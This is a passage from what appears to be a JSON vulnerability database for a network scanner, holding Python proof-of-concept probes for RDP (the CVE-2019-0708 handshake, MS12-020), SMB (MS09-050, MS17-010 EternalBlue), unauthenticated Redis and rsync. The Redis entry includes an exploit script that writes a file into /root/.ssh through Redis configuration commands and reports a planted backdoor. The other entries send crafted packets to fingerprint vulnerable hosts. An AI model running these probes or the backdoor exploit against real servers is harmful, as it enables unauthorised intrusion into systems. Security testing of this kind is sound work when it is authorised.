b\"\\x02\\xf0\\x80\"  # X.224\n                    b\"\\x64\"  # sendDataRequest\n                    b\"\\x00\\x08\"  # initiator\n                    b\"\\x03\\xeb\"  # channelId\n                    b\"\\x70\"  # dataPriority\n                    b\"%s\" % (flags).to_bytes(1, byteorder='big') +\n                    b\"%s\" % (userdata_length_low).to_bytes(1, byteorder='big') +  # UserData length\n                    b\"\\x01\\x00\"  # securityHeader flags\n                    b\"\\x00\\x00\"  # securityHeader flagsHi\n                    b\"%s\" % (bitlen).to_bytes(4, byteorder='little') +  # securityPkt length\n                    b\"%s\" % encrytedClientRandom +  # 64 bytes encrypted client random\n                    b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"  # 8 bytes rear padding\n            )\n\n        def _client_info():\n            return binascii.unhexlify(\n                \"000000003301000000000a00000000000000000075007300650072003000000000000000000002001c003100390032002e003100360038002e0031002e0032003000380000003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000\"\n            )\n\n        def _pdu_client_confirm_active():\n            return binascii.unhexlify(\n                \"a4011300f103ea030100ea0306008e014d53545343000e00000001001800010003000002000000000d04000000000000000002001c00100001000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000\"\n            )\n\n        def _pdu_client_persistent_key_list():\n            return binascii.unhexlify(\n                \"49031700f103ea03010000013b031c00000001000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n            )\n\n        def _try_check(rc4enckey, hmackey):\n            for i in range(5):\n                res = _rdp_recv()\n            for j in range(5):\n                _rdp_send(\n                    _rdp_encrypted_pkt(binascii.unhexlify(\"100000000300000000000000020000000000000000000000\"),\n                                            rc4enckey, hmackey, b\"\\x08\\x00\", b\"\\x00\\x00\", b\"\\x03\\xed\"))\n                _rdp_send(_rdp_encrypted_pkt(binascii.unhexlify(\n                    \"20000000030000000000000000000000020000000000000000000000000000000000000000000000\"), rc4enckey,\n                                                       hmackey, b\"\\x08\\x00\", b\"\\x00\\x00\", b\"\\x03\\xed\"))\n                for i in range(3):\n                    res = _rdp_recv()\n                    if binascii.unhexlify(\"0300000902f0802180\") in res:\n                        return True\n            return False\n\n        def _rdp_hmac(hmackey, data):\n            s = hashlib.sha1()\n            m = hashlib.md5()\n            pad1 = b'\\x36' * 40\n            pad2 = b'\\x5c' * 48\n            s.update(hmackey + pad1 + len(data).to_bytes(4, byteorder='little') + data)\n            m.update(hmackey + pad2 + s.digest())\n            return m.digest()\n\n        def _rdp_rc4_crypt(rc4enckey, data):\n            return rc4enckey.crypt(data)\n\n        def _rdp_encrypted_pkt(data, rc4enckey, hmackey, flags=b\"\\x08\\x00\", flagsHi=b\"\\x00\\x00\",\n                               channelId=b\"\\x03\\xeb\"):\n            userData_len = len(data) + 12\n            udl_with_flag = 0x8000 | userData_len\n            pkt = (\n                    b\"\\x02\\xf0\\x80\"  # X.224\n                    b\"\\x64\"  # sendDataRequest\n                    b\"\\x00\\x08\"  # initiator\n                    b\"%s\" % channelId +  # channelId\n                    b\"\\x70\"  # dataPriority\n                    b\"%s\" % (udl_with_flag.to_bytes(2, byteorder='big')) +  # udl_with_flag\n                    b\"%s\" % flags +  # flags  SEC_INFO_PKT | SEC_ENCRYPT\n                    b\"%s\" % flagsHi +  # flagsHi\n                    b\"%s\" % _rdp_hmac(hmackey, data)[0:8] +  # rdp_hmac\n                    b\"%s\" % _rdp_rc4_crypt(rc4enckey, data)  # drp_rc4_encrypt\n            )\n            tpkt = (\n                    b\"\\x03\\x00\"\n                    b\"%s\" % ((len(pkt) + 4).to_bytes(2, byteorder='big')) +\n                    b\"%s\" % pkt\n            )\n            return tpkt\n\n        def _rdp_parse_serverdata(pkt):\n            ptr = 0\n            rdp_pkt = pkt[0x49:]\n            while ptr < len(rdp_pkt):\n                header_type = rdp_pkt[ptr:ptr + 2]\n                header_length = int.from_bytes(rdp_pkt[ptr + 2:ptr + 4], byteorder='little')\n                _log(\"header type: %s, header length: %d\" % (_bin_to_hex(header_type), header_length))\n\n                if header_type == b'\\x02\\x0c':\n                    _log(\"security header\")\n                    server_random = rdp_pkt[ptr + 20:ptr + 52]\n                    public_exponent = rdp_pkt[ptr + 84:ptr + 88]\n                    modulus = rdp_pkt[ptr + 88:ptr + 152]\n                    _log(\"modulus old: %s\" % _bin_to_hex(modulus))\n                    _log(\"RSA magic: %s\" % rdp_pkt[ptr + 68:ptr + 72].decode())\n                    bitlen = int.from_bytes(rdp_pkt[ptr + 72:ptr + 76], byteorder='little') - 8\n                    _log(\"RSA bitlen: %d\" % bitlen)\n                    modulus = rdp_pkt[ptr + 88:ptr + 88 + bitlen]\n                    _log(\"modulus new: %s\" % _bin_to_hex(modulus))\n                ptr += header_length\n\n            _log(\"SERVER_MODULUS: %s\" % _bin_to_hex(modulus))\n            _log(\"SERVER_EXPONENT: %s\" % _bin_to_hex(public_exponent))\n            _log(\"SERVER_RANDOM: %s\" % _bin_to_hex(server_random))\n            rsmod = int.from_bytes(modulus, byteorder='little')\n            rsexp = int.from_bytes(public_exponent, byteorder='little')\n            rsran = int.from_bytes(server_random, byteorder='little')\n            _log(\"rsmod: %d\" % rsmod)\n            _log(\"rsexp: %d\" % rsexp)\n            _log(\"rsran: %d\" % rsran)\n            return rsmod, rsexp, rsran, server_random, bitlen\n\n        def _rdp_salted_hash(s_bytes, i_bytes, clientRandom_bytes, serverRandom_bytes):\n            m = hashlib.md5()\n            s = hashlib.sha1()\n            s.update(i_bytes + s_bytes + clientRandom_bytes + serverRandom_bytes)\n            m.update(s_bytes + s.digest())\n            return m.digest()\n\n        def _rdp_final_hash(k, clientRandom_bytes, serverRandom_bytes):\n            m = hashlib.md5()\n            m.update(k + clientRandom_bytes + serverRandom_bytes)\n            return m.digest()\n\n        def _rdp_calculate_rc4_keys(client_random, server_random):\n            preMasterSecret = client_random[0:24] + server_random[0:24]\n            masterSecret = _rdp_salted_hash(preMasterSecret, b\"A\", client_random,\n                                                 server_random) + _rdp_salted_hash(preMasterSecret, b\"BB\",\n                                                                                        client_random,\n                                                                                        server_random) + _rdp_salted_hash(\n                preMasterSecret, b\"CCC\", client_random, server_random)\n            sessionKeyBlob = _rdp_salted_hash(masterSecret, b\"X\", client_random,\n                                                   server_random) + _rdp_salted_hash(masterSecret, b\"YY\",\n                                                                                          client_random,\n                                                                                          server_random) + _rdp_salted_hash(\n                masterSecret, b\"ZZZ\", client_random, server_random)\n            initialClientDecryptKey128 = _rdp_final_hash(sessionKeyBlob[16:32], client_random, server_random)\n            initialClientEncryptKey128 = _rdp_final_hash(sessionKeyBlob[32:48], client_random, server_random)\n            macKey = sessionKeyBlob[0:16]\n            _log(\"PreMasterSecret: %s\" % _bin_to_hex(preMasterSecret))\n            _log(\"MasterSecret: %s\" % _bin_to_hex(masterSecret))\n            _log(\"sessionKeyBlob: %s\" % _bin_to_hex(sessionKeyBlob))\n            _log(\"mackey: %s\" % _bin_to_hex(macKey))\n            _log(\"initialClientDecryptKey128: %s\" % _bin_to_hex(initialClientDecryptKey128))\n            _log(\"initialClientEncryptKey128: %s\" % _bin_to_hex(initialClientEncryptKey128))\n            return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob\n\n        def _rdp_send(data):\n            _log(_bin_to_hex(data))\n            sock.sendall(data)\n\n        def _rdp_recv():\n            tptk_header = sock.recv(4)\n            body = sock.recv(int.from_bytes(tptk_header[2:4], byteorder='big'))\n            return tptk_header + body\n\n        def _rdp_send_recv(data):\n            _rdp_send(data)\n            return _rdp_recv()\n\n        def _check_rdp():\n            try:\n                _rdp_send_recv(_conn_req())\n            except Exception as e:\n                print(str(e))\n                return False\n            return True\n\n        def _check_rdp_vuln():\n            if not _check_rdp():\n                return False\n            # send initial client data\n            res = _rdp_send_recv(_connect_initial())\n            rsmod, rsexp, rsran, server_rand, bitlen = _rdp_parse_serverdata(res)\n\n            # erect domain and attach user\n            _rdp_send(_erect_domain_req())\n            res = _rdp_send_recv(_attach_user_req())\n            initiator = res[-2:]\n\n            # send channel requests\n            _rdp_send_recv(_channel_join_req(initiator, struct.pack('>H', 1009)))\n            _rdp_send_recv(_channel_join_req(initiator, struct.pack('>H', 1003)))\n            _rdp_send_recv(_channel_join_req(initiator, struct.pack('>H', 1004)))\n            _rdp_send_recv(_channel_join_req(initiator, struct.pack('>H', 1005)))\n            _rdp_send_recv(_channel_join_req(initiator, struct.pack('>H', 1006)))\n            _rdp_send_recv(_channel_join_req(initiator, struct.pack('>H', 1007)))\n            _rdp_send_recv(_channel_join_req(initiator, struct.pack('>H', 1008)))\n\n            client_rand = b'\\x41' * 32\n            rcran = int.from_bytes(client_rand, byteorder='little')\n            _log(\"Sending security exchange PDU\")\n            security_exchange_pdu = _security_exchange(rcran, rsexp, rsmod, bitlen)\n            _log(_bin_to_hex(security_exchange_pdu))\n            _rdp_send(security_exchange_pdu)\n\n            rc4encstart, rc4decstart, hmackey, sessblob = _rdp_calculate_rc4_keys(client_rand, server_rand)\n            rc4enckey = RC4(rc4encstart)\n\n            _log(\"Sending encrypted client info PDU\")\n            res = _rdp_send_recv(_rdp_encrypted_pkt(_client_info(), rc4enckey, hmackey, b\"\\x48\\x00\"))\n            _log(\"Received License packet: %s\" % _bin_to_hex(res))\n            res = _rdp_recv()\n            _log(\"Received Server Demand packet: %s\" % _bin_to_hex(res))\n            _log(\"Sending client confirm active PDU\")\n            _rdp_send(_rdp_encrypted_pkt(_pdu_client_confirm_active(), rc4enckey, hmackey, b\"\\x38\\x00\"))\n            _log(\"Sending client synchronize PDU\")\n            _log(\"Sending client control cooperate PDU\")\n\n            synch = _rdp_encrypted_pkt(binascii.unhexlify(\"16001700f103ea030100000108001f0000000100ea03\"),\n                                            rc4enckey, hmackey)\n            coop = _rdp_encrypted_pkt(binascii.unhexlify(\"1a001700f103ea03010000010c00140000000400000000000000\"),\n                                           rc4enckey, hmackey)\n            _log(\"Grea2t!\")\n            _rdp_send(synch)\n            _rdp_send(coop)\n\n            _log(\"Sending client control request control PDU\")\n            _rdp_send(\n                _rdp_encrypted_pkt(binascii.unhexlify(\"1a001700f103ea03010000010c00140000000100000000000000\"),\n                                        rc4enckey, hmackey))\n            _log(\"Sending client persistent key list PDU\")\n            _rdp_send(_rdp_encrypted_pkt(_pdu_client_persistent_key_list(), rc4enckey, hmackey))\n            _log(\"Sending client font list PDU\")\n            _rdp_send(\n                _rdp_encrypted_pkt(binascii.unhexlify(\"1a001700f103ea03010000010c00270000000000000003003200\"),\n                                        rc4enckey, hmackey))\n\n            return _try_check(rc4enckey, hmackey)\n\n        def _detect_os():\n            finger = {\n                \"2000/xp\": \"0300000b06d00000123400\",\n                \"2003\": \"030000130ed000001234000300080002000000\",\n                \"2008\": \"030000130ed000001234000200080002000000\",\n                \"win7/2008R2\": \"030000130ed000001234000209080002000000\",\n                \"2008R2DC\": \"030000130ed000001234000201080002000000\",\n                \"2012R2/8\": \"030000130ed00000123400020f080002000000\"\n            }\n            new_finger = dict(zip(finger.values(), finger.keys()))\n            s = _create_socket()\n            s.send(b\"\\x03\\x00\\x00\\x13\\x0e\\xe0\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x03\\x00\\x00\\x00\")\n            res = binascii.hexlify(s.recv(2048)).decode()\n            s.close()\n            if res in new_finger.keys():\n                return new_finger[res]\n            return ''\n\n        try:\n            os = _detect_os()\n        except Exception as e:\n            os = 'unknown'\n\n        sock = _create_socket()\n        if _check_rdp_vuln():\n            pocdict['isvul'] = True\n            pocdict['payload'] = binascii.unhexlify('49031700f103ea03010000013b031c00000001000000000000000000000000000000')\n            pocdict['proof'] = os\n            pocdict['response'] = binascii.unhexlify(\"0300000902f0802180\")\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "rdp",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "rdp_ms12_020",
            "description": "RDP MS12-020远程命令执行漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 3389\n    pocdict = {\n        \"vulnname\":\"rdp_ms12_020\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        connection_request = binascii.unhexlify(''.join([\n            \"0300\",  # TPKT Header version 03, reserved 0\n            \"0013\",  # Length\n            \"0e\",  # X.224 Data TPDU length\n            \"e0\",  # X.224 Type (Connection request)\n            \"0000\",  # dst reference\n            \"0000\",  # src reference\n            \"00\",  # class and options\n            \"01\",  # RDP Negotiation Message\n            \"00\",  # flags\n            \"0800\",  # RDP Negotiation Request Length\n            \"00000000\"  # RDP Negotiation Request\n        ]))\n        initial_pdu = binascii.unhexlify(''.join([\n            \"03000065\",  # TPKT Header\n            \"02f080\",  # Data TPDU, EOT\n            \"7f655b\",  # Connect-Initial\n            \"040101\",  # callingDomainSelector\n            \"040101\",  # calledDomainSelector\n            \"0101ff\",  # upwardFlag\n            \"3019\",  # targetParams + size (25 bytes)\n            \"020122\",  # maxChannelIds\n            \"020120\",  # maxUserIds\n            \"020100\",  # maxTokenIds\n            \"020101\",  # numPriorities\n            \"020100\",  # minThroughput\n            \"020101\",  # maxHeight\n            \"0202ffff\",  # maxMCSPDUSize\n            \"020102\",  # protocolVersion\n            \"3018\",  # minParams + size (24 bytes)\n            \"020101\",  # maxChannelIds\n            \"020101\",  # maxUserIds\n            \"020101\",  # maxTokenIds\n            \"020101\",  # numPriorities\n            \"020100\",  # minThroughput\n            \"020101\",  # maxHeight\n            \"0201ff\",  # maxMCSPDUSize\n            \"020102\",  # protocolVersion\n            \"3019\",  # maxParams + size (25 bytes)\n            \"0201ff\",  # maxChannelIds\n            \"0201ff\",  # maxUserIds\n            \"0201ff\",  # maxTokenIds\n            \"020101\",  # numPriorities\n            \"020100\",  # minThroughput\n            \"020101\",  # maxHeight\n            \"0202ffff\",  # maxMCSPDUSize\n            \"020102\",  # protocolVersion\n            \"0400\",  # userData\n        ]))\n        user_request = binascii.unhexlify(''.join([\n            \"0300\",  # header\n            \"0008\",  # length\n            # X.224 Data TPDU (2 bytes: 0xf0 = Data TPDU, 0x80 = EOT)\n            \"02f080\",\n            \"28\",  # PER encoded PDU contents\n        ]))\n        channel_join_request = binascii.unhexlify(\"0300000c02f08038\")\n        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        skt.connect((host, port))\n        print(\"[+][{0}] 发送RDP连接请求\".format(host))\n        skt.send(connection_request)\n        data = skt.recv(8192)\n        if data != binascii.unhexlify(\"0300000b06d00000123400\") and data != binascii.unhexlify(\"030000130ed000001234000201080000000000\"):\n            print(\"[+][{0}] 非RDP端口\".format(host))\n        print(\"[+][{0}] 发送PDU数据包\".format(host))\n        skt.send(initial_pdu)\n        # Send attach user request\n        skt.send(user_request)\n        data = skt.recv(8192)\n        user1 = data[9:11]\n        # Send another attach user request\n        skt.send(user_request)\n        data = skt.recv(8192)\n        user2_int = int(binascii.hexlify(data[9:11]), base=16)\n        user2 = struct.pack('!H', user2_int + 1001)\n        # Send channel join request\n        print(\"[+][{0}] 发送channel请求包\".format(host))\n        skt.send(channel_join_request + user1 + user2)\n        data = skt.recv(8192)\n        if data[7:9] == \"\\x3e\\x00\":\n            pocdict['isvul'] = True\n            pocdict['payload'] = user_request\n            pocdict['proof'] = 'user1: {0} user2: {1}'.format(user1, user2)\n            pocdict['response'] = data\n\n        skt.close()\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "rdp",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "redis_server_unauth",
            "description": "Redis服务器未授权漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 6379\n    pocdict = {\n        \"vulnname\":\"redis_server_unauth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        r = redis.Redis(host, port, db=0, socket_timeout=8)\n        if r.ping():\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'PING'\n            pocdict['proof'] = 'PONG'\n            pocdict['response'] = r.info()\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "#!/usr/bin/env python\n#coding=utf-8\n\nimport os\nimport sys\nimport redis\nfrom termcolor import colored, cprint\n\ndef check_vul(ip):\n\ttry:\n\t\tr = redis.Redis(ip, port=6379, db=10, socket_timeout=1.0)\n\t\tif r.ping() is True:\n\t\t\tcprint('[+]存在漏洞: redis服务器未授权访问!', 'red')\n\t\t\treturn True\n\t\telse:\n\t\t\tprint '[-]主人,检查完redis,不存在未授权漏洞..'\n\t\t\treturn False\n\texcept:\n\t\tprint '[-]主人,检查完redis,不存在未授权漏洞..'\n\t\treturn False\n\ndef get_shell(ip):\n\tcmd_str = 'cat foo.txt | redis-cli -h %s -x set 4b378055b5b521da6e2b7536e21b22c1'%ip\n\tr = redis.Redis(ip, port=6379, db=0, socket_timeout=1.0)\n\ttry:\n\t\tres = os.popen(cmd_str).read()\n\t\tif r.config_set('dir', '/root/.ssh/') is True:\n\t\t\tcprint ('设置目录/root/.ssh', 'red')\n\t\t\tif r.config_set('dbfilename', 'foo.txt') is True:\n\t\t\t\tcprint ('插入后门成功!', 'red')\n\t\t\t\tr.save()\n\t\t\t\tcprint ('老大，快爆菊花，菊花地址:\\t%s'%ip, 'red')\n\t\t\telse:\n\t\t\t\tprint '插入后门失败!'\n\texcept:\n\t\tprint '没有权限，秒下一个呗..'\n\ndef main(ip):\n\tif check_vul(ip) is True:\n\t\tget_shell(ip)\n\telse:\n\t\tprint '拉倒吧，啥玩意没有'\n\nif __name__ == '__main__':\n\tmain(sys.argv[1])",
            "sysname": "redis",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "rsync_unauth",
            "description": "rsync 未授权漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 873\n    pocdict = {\n        \"vulnname\":\"rsync_unauth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        payload = '\\x40\\x52\\x53\\x59\\x4e\\x43\\x44\\x3a\\x20\\x33\\x31\\x2e\\x30\\x0a'\n        sock.connect((host, port))\n        sock.sendall(payload)\n        time.sleep(2)\n        initinfo = sock.recv(400)\n        if \"RSYNCD\" in initinfo:\n            sock.sendall(\"\\x0a\")\n            time.sleep(2)\n        modulelist = sock.recv(200)\n        if len(modulelist) > 0:\n            pocdict['isvul'] = True\n            pocdict['payload'] = binascii.unhexlify(payload)\n            pocdict['proof'] = modulelist\n            pocdict['response'] = initinfo\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "rsync",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "smb_ms09_050_smbv2_rce",
            "description": "SMB v2远程代码执行漏洞(CVE-2009-2532/CVE-2009-3103)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 445\n    pocdict = {\n        \"vulnname\":\"smb_ms09_050_smbv2_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        payload = \"0000009dff534d4272000000001853c80100000000000000000000000000000000000000007a000254454e41424c455f4e4554574f524b5f534543555249545900024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e31320002534d4220322e3030320002534d4220322e3f3f3f00\"\n        sock.connect((host, port))\n        sock.sendall(binascii.unhexlify(payload))\n        res = sock.recv(1024)\n        if b\"TENABLE_NETWORK_SECURITY\" in res:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(binascii.unhexlify(payload))\n            pocdict['proof'] = \"TENABLE_NETWORK_SECURITY flag found\"\n            pocdict['response'] = str(res)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "smb",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "smb_ms17_010_eternalblue",
            "description": "永恒之蓝漏洞(MS17-010)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 445\n    pocdict = {\n        \"vulnname\":\"smb_ms17_010_eternalblue\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        # Packets\n        NEGOTIATE_PROTOCOL_REQUEST = binascii.unhexlify(\n            \"00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200\")\n        SESSION_SETUP_REQUEST = binascii.unhexlify(\n            \"00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000\")\n        TREE_CONNECT_REQUEST = binascii.unhexlify(\n            \"00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00\")\n        NAMED_PIPE_TRANS_REQUEST = binascii.unhexlify(\n            \"0000004aff534d42250000000018012800000000000000000000000000088ea3010852981000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00\")\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(float(10))\n        sock.connect((host, port))\n        sock.send(NEGOTIATE_PROTOCOL_REQUEST)\n        print(\"[+][{0}] 发送NEGOTIATE协议数据包\".format(host))\n        negotiate_reply = sock.recv(1024)\n        if len(negotiate_reply) < 36 or struct.unpack(\"<I\", negotiate_reply[9:13])[0] != 0:\n            print(\"[-] 无法检测是否存在漏洞\")\n        sock.send(SESSION_SETUP_REQUEST)\n        session_setup_response = sock.recv(1024)\n        user_id = session_setup_response[32:34]\n        print(\"[+][{0}] user_id: {1}\".format(host, struct.unpack(\"<H\", user_id)))\n        os = ''\n        word_count = session_setup_response[36]\n        if word_count != 0:\n            # find byte count\n            byte_count = struct.unpack(\"<H\", session_setup_response[43:45])[0]\n            if len(session_setup_response) != byte_count + 45:\n                print(\"[-][{0}] 无效的session响应\".format(host))\n            else:\n                # two continous null bytes indicate end of a unicode string\n                for i in range(46, len(session_setup_response) - 1):\n                    if session_setup_response[i] == 0 and session_setup_response[i + 1] == 0:\n                        # not necessary to support unicode\n                        os = session_setup_response[46:i].decode(\"utf-8\")\n                        break\n        modified_tree_connect_request = list(TREE_CONNECT_REQUEST)\n        modified_tree_connect_request[32] = user_id[0]\n        modified_tree_connect_request[33] = user_id[1]\n        modified_tree_connect_request = ''.join('{:02x}'.format(int(i)) for i in modified_tree_connect_request)\n        modified_tree_connect_request = binascii.unhexlify(modified_tree_connect_request)\n        sock.send(modified_tree_connect_request)\n        print(\"[+][{0}] 发送modified_tree连接请求\".format(host))\n        tree_connect_response = sock.recv(1024)\n        tree_id = tree_connect_response[28:30]\n        print(\"[+][{0}] tree_id: {1}\".format(host, struct.unpack(\"<H\", tree_id)))\n        modified_trans2_session_setup = list(NAMED_PIPE_TRANS_REQUEST)\n        modified_trans2_session_setup[28] = tree_id[0]\n        modified_trans2_session_setup[29] = tree_id[1]\n        modified_trans2_session_setup[32] = user_id[0]\n        modified_trans2_session_setup[33] = user_id[1]\n        modified_trans2_session_setup = ''.join('{:02x}'.format(int(i)) for i in modified_trans2_session_setup)\n        modified_trans2_session_setup = binascii.unhexlify(modified_trans2_session_setup)\n        sock.send(modified_trans2_session_setup)\n        print(\"[+][{0}] 发送trans2_session连接请求\".format(host))\n        final_response = sock.recv(1024)\n        if final_response[9] == 5 and final_response[10] == 2 and final_response[11] == 0 and final_response[12] == 192:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(SESSION_SETUP_REQUEST)\n            pocdict['proof'] = \"tree_id:{0} found, OS: {1}\".format(struct.unpack(\"<H\", tree_id), os)\n            pocdict['response'] = str(final_response)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "smb",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "smb_v3_ghost_rce",
            "description": "SMBv3 Ghost RCE漏洞(CVE-2020-0796)",
